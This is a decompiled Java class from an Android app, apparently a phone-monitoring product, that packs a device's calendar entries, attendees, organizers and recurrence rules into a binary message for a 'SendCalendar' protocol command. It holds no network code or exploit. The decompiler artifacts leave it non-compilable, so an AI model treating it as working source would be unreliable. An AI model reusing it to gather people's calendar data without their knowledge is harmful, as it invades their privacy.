package com.vvt.phoenix.prot.a;

import com.vvt.phoenix.prot.command.data.CalendarEntry;
import com.vvt.phoenix.prot.command.data.CalendarEntry.EntryType;
import com.vvt.phoenix.prot.command.data.CalendarEntry.Priority;
import com.vvt.phoenix.prot.command.data.CalendarEntry.Recurring;
import com.vvt.phoenix.prot.command.data.CalendarRecurrence;
import com.vvt.phoenix.prot.command.data.CalendarRecurrence.FirstDayOfWeek;
import com.vvt.phoenix.prot.command.data.CalendarRecurrence.RecurrenceType;
import com.vvt.phoenix.prot.command.data.e;
import com.vvt.phoenix.prot.command.data.f;
import com.vvt.phoenix.prot.command.w;
import java.io.ByteArrayOutputStream;
import java.util.ArrayList;

public class b
{
  private static final boolean a;
  
  static
  {
    boolean bool = com.vvt.phoenix.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      return;
    }
  }
  
  private static void a(CalendarEntry paramCalendarEntry, ByteArrayOutputStream paramByteArrayOutputStream)
  {
    int i = 0;
    Object localObject1 = null;
    int j = 19;
    if (paramCalendarEntry == null)
    {
      localObject2 = "CalendarParser > parseCalendarEntry # entry is null";
      i = a;
      if (i != 0) {}
      localObject1 = new java/lang/IllegalArgumentException;
      ((IllegalArgumentException)localObject1).<init>((String)localObject2);
      throw ((Throwable)localObject1);
    }
    Object localObject2 = paramCalendarEntry.a();
    boolean bool1 = a;
    if (bool1) {}
    com.vvt.phoenix.a.d.a((String)localObject2, paramByteArrayOutputStream);
    boolean bool7 = a;
    if (bool7) {}
    int i3 = (byte)paramCalendarEntry.b().getValue();
    paramByteArrayOutputStream.write(i3);
    localObject2 = paramCalendarEntry.c();
    bool1 = a;
    if (bool1) {}
    com.vvt.phoenix.a.d.b((String)localObject2, paramByteArrayOutputStream);
    localObject2 = paramCalendarEntry.d();
    if (localObject2 != null)
    {
      int k = ((String)localObject2).length();
      if (k == j) {}
    }
    else
    {
      bool8 = a;
      if (bool8) {}
      localObject2 = "0000-00-00 00:00:00";
    }
    boolean bool2 = a;
    if (bool2) {}
    localObject2 = com.vvt.phoenix.a.a.a((String)localObject2);
    paramByteArrayOutputStream.write((byte[])localObject2, 0, j);
    localObject2 = paramCalendarEntry.e();
    if (localObject2 != null)
    {
      int m = ((String)localObject2).length();
      if (m == j) {}
    }
    else
    {
      bool8 = a;
      if (bool8) {}
      localObject2 = "0000-00-00 00:00:00";
    }
    boolean bool3 = a;
    if (bool3) {}
    localObject2 = com.vvt.phoenix.a.a.a((String)localObject2);
    paramByteArrayOutputStream.write((byte[])localObject2, 0, j);
    localObject2 = paramCalendarEntry.f();
    if (localObject2 != null)
    {
      int n = ((String)localObject2).length();
      if (n == j) {}
    }
    else
    {
      bool8 = a;
      if (bool8) {}
      localObject2 = "0000-00-00 00:00:00";
    }
    boolean bool4 = a;
    if (bool4) {}
    localObject2 = com.vvt.phoenix.a.a.a((String)localObject2);
    paramByteArrayOutputStream.write((byte[])localObject2, 0, j);
    localObject2 = paramCalendarEntry.g();
    if (localObject2 != null)
    {
      int i1 = ((String)localObject2).length();
      if (i1 == j) {}
    }
    else
    {
      bool8 = a;
      if (bool8) {}
      localObject2 = "0000-00-00 00:00:00";
    }
    boolean bool5 = a;
    if (bool5) {}
    localObject2 = com.vvt.phoenix.a.a.a((String)localObject2);
    paramByteArrayOutputStream.write((byte[])localObject2, 0, j);
    localObject2 = paramCalendarEntry.h();
    if (localObject2 != null)
    {
      int i2 = ((String)localObject2).length();
      if (i2 == j) {}
    }
    else
    {
      bool8 = a;
      if (bool8) {}
      localObject2 = "0000-00-00 00:00:00";
    }
    boolean bool6 = a;
    if (bool6) {}
    localObject2 = com.vvt.phoenix.a.a.a((String)localObject2);
    paramByteArrayOutputStream.write((byte[])localObject2, 0, j);
    boolean bool8 = a;
    if (bool8) {}
    int i4 = (byte)paramCalendarEntry.i().getValue();
    paramByteArrayOutputStream.write(i4);
    localObject2 = paramCalendarEntry.j();
    bool6 = a;
    if (bool6) {}
    com.vvt.phoenix.a.d.b((String)localObject2, paramByteArrayOutputStream);
    localObject2 = paramCalendarEntry.k();
    bool6 = a;
    if (bool6) {}
    com.vvt.phoenix.a.d.b((String)localObject2, paramByteArrayOutputStream);
    localObject2 = paramCalendarEntry.l();
    a((f)localObject2, paramByteArrayOutputStream);
    ArrayList localArrayList = paramCalendarEntry.m();
    if (localArrayList == null)
    {
      localObject2 = "CalendarParser > parseCalendarEntry # attendee list is null";
      i = a;
      if (i != 0) {}
      localObject1 = new java/lang/IllegalArgumentException;
      ((IllegalArgumentException)localObject1).<init>((String)localObject2);
      throw ((Throwable)localObject1);
    }
    j = localArrayList.size();
    boolean bool9 = a;
    if (bool9) {}
    short s = (short)j;
    localObject2 = com.vvt.phoenix.a.a.a(s);
    int i7 = 2;
    paramByteArrayOutputStream.write((byte[])localObject2, 0, i7);
    while (i < j)
    {
      localObject2 = (e)localArrayList.get(i);
      a((e)localObject2, paramByteArrayOutputStream);
      int i5 = i + 1;
      i = i5;
    }
    boolean bool10 = a;
    if (bool10) {}
    int i6 = paramCalendarEntry.n().getValue();
    paramByteArrayOutputStream.write(i6);
    localObject2 = paramCalendarEntry.n();
    localObject1 = CalendarEntry.Recurring.YES;
    if (localObject2 == localObject1)
    {
      localObject2 = paramCalendarEntry.o();
      a((CalendarRecurrence)localObject2, paramByteArrayOutputStream);
    }
  }
  
  private static void a(CalendarRecurrence paramCalendarRecurrence, ByteArrayOutputStream paramByteArrayOutputStream)
  {
    int i = 19;
    if (paramCalendarRecurrence == null)
    {
      localObject = "CalendarParser > paresRecurrence # recurrence is null";
      boolean bool1 = a;
      if (bool1) {}
      localIllegalArgumentException = new java/lang/IllegalArgumentException;
      localIllegalArgumentException.<init>((String)localObject);
      throw localIllegalArgumentException;
    }
    Object localObject = paramCalendarRecurrence.a();
    if (localObject != null)
    {
      int j = ((String)localObject).length();
      if (j == i) {}
    }
    else
    {
      bool3 = a;
      if (bool3) {}
      localObject = "0000-00-00 00:00:00";
    }
    boolean bool2 = a;
    if (bool2) {}
    localObject = com.vvt.phoenix.a.a.a((String)localObject);
    paramByteArrayOutputStream.write((byte[])localObject, 0, i);
    localObject = paramCalendarRecurrence.b();
    if (localObject != null)
    {
      int k = ((String)localObject).length();
      if (k == i) {}
    }
    else
    {
      bool3 = a;
      if (bool3) {}
      localObject = "0000-00-00 00:00:00";
    }
    int m = a;
    if (m != 0) {}
    localObject = com.vvt.phoenix.a.a.a((String)localObject);
    paramByteArrayOutputStream.write((byte[])localObject, 0, i);
    boolean bool3 = a;
    if (bool3) {}
    localObject = paramCalendarRecurrence.c();
    int n = (byte)((CalendarRecurrence.RecurrenceType)localObject).getValue();
    paramByteArrayOutputStream.write(n);
    boolean bool4 = a;
    if (bool4) {}
    int i1 = (byte)paramCalendarRecurrence.d();
    paramByteArrayOutputStream.write(i1);
    boolean bool5 = a;
    if (bool5) {}
    localObject = paramCalendarRecurrence.e();
    int i2 = (byte)((CalendarRecurrence.FirstDayOfWeek)localObject).getValue();
    paramByteArrayOutputStream.write(i2);
    boolean bool6 = a;
    if (bool6) {}
    int i3 = (byte)paramCalendarRecurrence.f();
    paramByteArrayOutputStream.write(i3);
    boolean bool7 = a;
    if (bool7) {}
    int i4 = (byte)paramCalendarRecurrence.g();
    paramByteArrayOutputStream.write(i4);
    boolean bool8 = a;
    if (bool8) {}
    int i5 = (byte)paramCalendarRecurrence.h();
    paramByteArrayOutputStream.write(i5);
    boolean bool9 = a;
    if (bool9) {}
    int i6 = (byte)paramCalendarRecurrence.i();
    paramByteArrayOutputStream.write(i6);
    boolean bool10 = a;
    if (bool10) {}
    int i7 = (byte)paramCalendarRecurrence.j();
    paramByteArrayOutputStream.write(i7);
    boolean bool11 = a;
    if (bool11) {}
    int i8 = (byte)paramCalendarRecurrence.k();
    paramByteArrayOutputStream.write(i8);
    int i10 = paramCalendarRecurrence.l();
    boolean bool12 = a;
    if (bool12) {}
    short s = (short)i10;
    localObject = com.vvt.phoenix.a.a.a(s);
    paramByteArrayOutputStream.write((byte[])localObject, 0, 2);
    m = 0;
    IllegalArgumentException localIllegalArgumentException = null;
    while (m < i10)
    {
      localObject = paramCalendarRecurrence.h(m);
      if (localObject != null)
      {
        int i11 = ((String)localObject).length();
        if (i11 == i) {}
      }
      else
      {
        boolean bool13 = a;
        if (bool13) {}
        localObject = "0000-00-00 00:00:00";
      }
      boolean bool14 = a;
      if (bool14) {}
      localObject = com.vvt.phoenix.a.a.a((String)localObject);
      paramByteArrayOutputStream.write((byte[])localObject, 0, i);
      int i9 = m + 1;
      m = i9;
    }
  }
  
  private static void a(e parame, ByteArrayOutputStream paramByteArrayOutputStream)
  {
    if (parame == null)
    {
      str = "CalendarParser > parseAttendee # attendee is null";
      bool = a;
      if (bool) {}
      IllegalArgumentException localIllegalArgumentException = new java/lang/IllegalArgumentException;
      localIllegalArgumentException.<init>(str);
      throw localIllegalArgumentException;
    }
    String str = parame.a();
    boolean bool = a;
    if (bool) {}
    com.vvt.phoenix.a.d.a(str, paramByteArrayOutputStream);
    str = parame.b();
    bool = a;
    if (bool) {}
    com.vvt.phoenix.a.d.a(str, paramByteArrayOutputStream);
  }
  
  private static void a(f paramf, ByteArrayOutputStream paramByteArrayOutputStream)
  {
    if (paramf == null)
    {
      str = "CalendarParser > parseOrganizer # organizer is null";
      bool = a;
      if (bool) {}
      IllegalArgumentException localIllegalArgumentException = new java/lang/IllegalArgumentException;
      localIllegalArgumentException.<init>(str);
      throw localIllegalArgumentException;
    }
    String str = paramf.a();
    boolean bool = a;
    if (bool) {}
    com.vvt.phoenix.a.d.a(str, paramByteArrayOutputStream);
    str = paramf.b();
    bool = a;
    if (bool) {}
    com.vvt.phoenix.a.d.a(str, paramByteArrayOutputStream);
  }
  
  public static byte[] a(w paramw)
  {
    boolean bool1 = a;
    if (bool1) {}
    ByteArrayOutputStream localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
    localByteArrayOutputStream.<init>();
    ArrayList localArrayList1;
    try
    {
      localArrayList1 = paramw.b();
      if (localArrayList1 == null)
      {
        String str = "CalendarParser > parseSendCalendar # calendar list is null";
        j = a;
        if (j != 0) {}
        localObject3 = new java/lang/IllegalArgumentException;
        ((IllegalArgumentException)localObject3).<init>(str);
        throw ((Throwable)localObject3);
      }
    }
    finally
    {
      com.vvt.io.d.a(localByteArrayOutputStream);
    }
    int k = localArrayList1.size();
    bool1 = a;
    if (bool1) {}
    short s1 = (short)k;
    Object localObject2 = com.vvt.phoenix.a.a.a(s1);
    int j = 0;
    Object localObject3 = null;
    int m = 2;
    localByteArrayOutputStream.write((byte[])localObject2, 0, m);
    int i;
    for (m = 0; m < k; m = i)
    {
      localObject2 = localArrayList1.get(m);
      localObject2 = (com.vvt.phoenix.prot.command.data.d)localObject2;
      if (localObject2 == null)
      {
        localObject2 = "CalendarParser > parseSendCalendar # calendar is null";
        j = a;
        if (j != 0) {}
        localObject3 = new java/lang/IllegalArgumentException;
        ((IllegalArgumentException)localObject3).<init>((String)localObject2);
        throw ((Throwable)localObject3);
      }
      localObject3 = ((com.vvt.phoenix.prot.command.data.d)localObject2).a();
      boolean bool4 = a;
      if (bool4) {}
      com.vvt.phoenix.a.d.a((String)localObject3, localByteArrayOutputStream);
      localObject3 = ((com.vvt.phoenix.prot.command.data.d)localObject2).b();
      bool4 = a;
      if (bool4) {}
      com.vvt.phoenix.a.d.a((String)localObject3, localByteArrayOutputStream);
      ArrayList localArrayList2 = ((com.vvt.phoenix.prot.command.data.d)localObject2).c();
      if (localArrayList2 == null)
      {
        localObject2 = "CalendarParser > parseSendCalendar # entry list is null";
        j = a;
        if (j != 0) {}
        localObject3 = new java/lang/IllegalArgumentException;
        ((IllegalArgumentException)localObject3).<init>((String)localObject2);
        throw ((Throwable)localObject3);
      }
      int n = localArrayList2.size();
      boolean bool2 = a;
      if (bool2) {}
      short s2 = (short)n;
      localObject2 = com.vvt.phoenix.a.a.a(s2);
      j = 0;
      localObject3 = null;
      int i1 = 2;
      localByteArrayOutputStream.write((byte[])localObject2, 0, i1);
      j = 0;
      localObject3 = null;
      while (j < n) {
        try
        {
          localObject2 = localArrayList2.get(j);
          localObject2 = (CalendarEntry)localObject2;
          a((CalendarEntry)localObject2, localByteArrayOutputStream);
          i = j + 1;
          j = i;
        }
        catch (IllegalArgumentException localIllegalArgumentException)
        {
          bool3 = a;
          if (bool3) {}
          throw localIllegalArgumentException;
        }
      }
      i = m + 1;
    }
    byte[] arrayOfByte = localByteArrayOutputStream.toByteArray();
    boolean bool3 = a;
    if (bool3) {}
    com.vvt.io.d.a(localByteArrayOutputStream);
    return arrayOfByte;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */